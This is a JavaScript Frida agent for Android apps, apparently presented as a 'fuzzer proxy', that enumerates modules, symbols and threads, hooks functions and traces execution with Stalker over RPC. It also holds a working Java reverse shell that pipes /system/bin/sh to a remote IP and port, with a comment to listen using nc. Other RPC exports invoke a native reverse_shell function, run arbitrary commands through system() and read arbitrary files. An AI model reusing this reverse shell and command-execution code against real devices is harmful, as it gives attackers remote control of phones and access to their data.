class FuzzerKu
{

    constructor() {
       this.rpc_setup();
       this.typeLog = "send";
    }

    locateData() {
       const self = this;
       Java.perform(function () {
          var context = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();

          Java.scheduleOnMainThread(function() {
             var toast = Java.use("android.widget.Toast");
             toast.makeText(Java.use("android.app.ActivityThread").currentApplication().getApplicationContext(), Java.use("java.lang.String").$new("Fuzzer proxy v1.0"), 1).show();
          });

          //var data = context.getApplicationInfo().dataDir;
          //self.pwd = data.value;

          var data = context.getPackageName();
          self.pwd = "/data/data/"+data;
       });
    }

    locatelib() {
       var modulesArray = Process.enumerateModules();
       for (var i=0; i<modulesArray.length; i++)
       {
          if (modulesArray[i].path.indexOf(this.injectedlib) != -1)
          {
             var str = modulesArray[i].path;
             return str.substring(0, str.lastIndexOf("/"))
          }
       }
    }

    sleep(ms) {
        var start = new Date().getTime(), expire = start + ms;
        while (new Date().getTime() < expire) { }
        return;
    }

    logDebug(type, msg, subtype) {
        if (type == "send") {
           if (subtype == "em")
               send({"type": "enum_modules", "log": msg});
           else if (subtype == "es")
               send({"type": "enum_symbols", "log": msg});
           else if (subtype == "et")
               send({"type": "enum_threads", "log": msg});
           else if (subtype == "id_threads")
               send({"type": "id_threads", "log": msg});
           else if (subtype == "hook_hit")
               send({"type": "hook_hit", "log": msg});

           else if (subtype == "bb_hit")
               send({"type": "bb_hit", "log": msg});


           else if (subtype == "stalker")
               send({"type": "stalker", "log": msg});

           else if (subtype == "bnlog")
               send({"type": "bnlog", "log": msg});

           else if (subtype == "info")
               send({"type": "info", "log": msg});

        }
        else if (type == "console") {
           console.log(msg);
        }
    }

    reverseShellJava(sip, sport) { // server listen: nc -lp 9090
        Java.perform(function () {
           const Socket = Java.use('java.net.Socket');
           const OutputStream = Java.use('java.io.OutputStream');
           const InputStream = Java.use('java.io.InputStream');
           const JavaString = Java.use('java.lang.String');
           const ProcessBuilder = Java.use('java.lang.ProcessBuilder');
           const Thread = Java.use('java.lang.Thread');
           const ArrayList = Java.use('java.util.ArrayList');
           const host = JavaString.$new(sip);
           const port = parseInt(sport);

           console.log("connect to: "+sip)

           var arr = Java.array('java.lang.String', ['/system/bin/sh']);
           var p = ProcessBuilder.$new.overload('[Ljava.lang.String;').call(ProcessBuilder, arr).redirectErrorStream(true).start();
           var s = Socket.$new.overload('java.lang.String', 'int').call(Socket, host, port);

           var pi = p.getInputStream();
           var pe = p.getErrorStream();
           var si = s.getInputStream();

           var po = p.getOutputStream(),
           so = s.getOutputStream();

           var i = 0;
           while(!s.isClosed())
           {
              while(pi.available()>0) {
                so.write(pi.read());
              }
              while(pe.available()>0) {
                so.write(pe.read());
              }
              while(si.available()>0) {
                po.write(si.read());
              }
              so.flush();
              po.flush();

              Thread.sleep(50);
              try {
                p.exitValue();
                break;
              } catch (e){
                // ignore
              }
           }
           p.destroy();
           s.close();
       });
    }

    addrToSymb(summary)
    {
      /* this sample data of summary
         {
            "0x73739255c4": 1,
         }
      */
       var output = []

       for (const addr in summary)
       {
          const cc = summary[addr]
          const sym = DebugSymbol.fromAddress(ptr(addr))

          const out = {
             "addr": addr,
             "call_count": cc,
             "column": sym.column,
             "fileName": sym.fileName,
             "lineNumber": sym.lineNumber,
             "moduleName": sym.moduleName,
             "name": sym.name
          };

          output.push(out)
       }
       return output
    }

    stalkingfunc(addr, filter)
    {
        console.log("[+] Agent @ Done."); //entah kenapa console ini penting

        const subthis = this

        Interceptor.attach(addr, {
            onEnter(args) {
                const sym = DebugSymbol.fromAddress(addr)
                subthis.logDebug("send", sym.name, "hook_hit");

                /* block */
                if (filter == "zsetup_block") {

                    Stalker.follow(this.threadId, {
                        events: {
                            compile: true
                        },
                        onReceive: function (events) {
                            var bbs = Stalker.parse(events, {
                                stringify: false,
                                annotate: false
                            });

                            for (var i=0; i<bbs.length; i++) {
                                //console.log(""+i+": "+bbs[i])

                                /* bbs[i][0] = first bb
                                 * bbs[i][1] = last bb
                                */
                                subthis.logDebug("send", bbs[i][0], "bb_hit");
                            }
                        }
                    });
                    return
                }

                /* intruction */
                Stalker.follow(this.threadId, {
                    transform: function(iterator) {
                        let instruction = iterator.next();
                        do {
                            if (filter == "all") {
                                subthis.logDebug("send", instruction, "bnlog");
                            }
                            else {
                                if (instruction.mnemonic == filter) {
                                    iterator.putCallout(printRet);
                                }
                            }
                            iterator.keep();
                        } while ((instruction = iterator.next()) !== null);
                    },

                });
            },
            onLeave(retval) {
               Stalker.unfollow(this.threadId);
            }
        });

        function printRet(context) {
            //console.log(filter+' @ ' + context.pc);
            subthis.logDebug("send", filter+" @ "+context.pc, "bnlog");
        }
    }
    rpc_setup()
    {
        rpc.exports = {
            enummodules: () => {
               this.logDebug("send", "Agent @ Getting modules...", "info");

               const output = Process.enumerateModulesSync();

               this.logDebug("send", output, "em");
            },
            enumsymbols: (module) => {
               this.logDebug("send", "Agent @ Getting symbols...", "info");
               const output = Module.enumerateSymbols(module)

               this.logDebug("send", output, "es");
            },
            enumthreads: () => {
               this.logDebug("send", "Agent @ Getting thread...", "info");
               const output = Process.enumerateThreadsSync()

               this.logDebug("send", output, "et");
            },
            enumsymbolstrace: (module) => {
               this.logDebug("send", "Agent @ Getting symbols to hook...", "info");

               const dick_sym = Module.enumerateSymbols(module)

               return dick_sym

            },
            idthreads: () => {

               const aa = Process.enumerateThreadsSync()

               var output = []

               //remove context data
               for (const key in aa)
               {
                  const id = aa[key]["id"];
                  const state = aa[key]["state"];
                  const name = aa[key]["name"];

                  const out = {
                     "id": id,
                     "state": state,
                     "name": name
                  };

                  output.push(out)
               }

               this.logDebug("send", output, "id_threads");
            },
            setstalker: (sw, id, filter) => {
               if (sw == "intruksi") {
                  if (filter == "") {
                      this.logDebug("send", "Agent @ Setup Stalker addr: "+id, "info");

                      this.stalkingfunc(ptr(id), "all")
                  }
                  else {
                      this.logDebug("send", "Agent @ Setup Stalker addr: "+id+" with filter: "+filter, "info");

                      this.stalkingfunc(ptr(id), filter)
                  }

                  return
               }
               else if (sw == "exit") {
                  Stalker.unfollow(id);
                  return
               }

               this.logDebug("send", "Agent @ Setup Stalker...", "info");

               const subthis = this

               Stalker.follow(id, {
                  events: {
                     call: true,
                     ret: false,
                     exec: false,
                     block: false,
                     compile: false,
                  },
                  onReceive: function (events) {
                     var calls = Stalker.parse(events, {
                        annotate: true,
                     });
                     /*for (var i=0; i<calls.length; i++) {
                        let call = calls[i];
                        console.log(call[2]);

                        //subthis.logDebug("send", call[2], "stalker");
                     }*/
                  },
                  onCallSummary: function (summary) { //only function call
                     //const data = JSON.stringify(summary, null, 4);
                     //console.log(data)
                     const out_stalker = subthis.addrToSymb(summary)

                     subthis.logDebug("send", out_stalker, "stalker");

                  }
               });
            },
            setuphook: (func_name, fstalking) => {

               const subthis = this;
               const addr = DebugSymbol.fromName(func_name).address;

               if (fstalking != -1) {
                   this.logDebug("send", "Agent @ Setup hook: "+func_name+" with stalking: "+fstalking, "info");

                   this.stalkingfunc(addr, fstalking)
               }
               else {
                   this.logDebug("send", "Agent @ Setup hook: "+func_name, "info");
                   Interceptor.attach(addr, {
                       onEnter: function(args) {
                           subthis.logDebug("send", func_name, "hook_hit");
                       }
                   });
               }

            },
            reshelljava: (sip, sport) => {
               this.reverseShellJava(sip, sport);
            },
            reshell: (sip, sport, sbin) => {
               const rshellAddr = DebugSymbol.fromName("reverse_shell").address;
               const rshell = new NativeFunction(rshellAddr, "void", ["pointer", "pointer", "int"]);
               const ip = Memory.allocUtf8String(sip);
               const bin = Memory.allocUtf8String(sbin);
               const port = parseInt(sport);

               rshell(ip, bin, port);
               return "[JS] fork shell created.";
            },
            shell: (cmd) => {
               const systemAddr = DebugSymbol.fromName("system").address;
               const system = new NativeFunction(systemAddr, "pointer", ["pointer"]);
               const syscmd = Memory.allocUtf8String(cmd);
               system(syscmd);

               return 0;
            },
            readtext: (pathname_raw) => {
               const read_textAddr = DebugSymbol.fromName("read_text").address;
               const read_text = new NativeFunction(read_textAddr, "pointer", ["pointer"]);
               const pathname = Memory.allocUtf8String(pathname_raw);

               return read_text(pathname).readCString();
            }
        };
    }

}

const f = new FuzzerKu();
rpc.exports.fuzzer = f;




